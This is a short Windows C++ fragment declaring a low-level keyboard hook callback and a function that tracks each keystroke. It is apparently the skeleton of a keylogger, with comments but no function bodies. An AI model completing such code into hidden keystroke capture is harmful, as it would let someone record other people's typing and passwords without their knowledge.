#define UNICODE
#include <windows.h>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.

int Track(int key_stroke);

// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

void SetHook();
void ReleaseHook();
int Track(int key_stroke);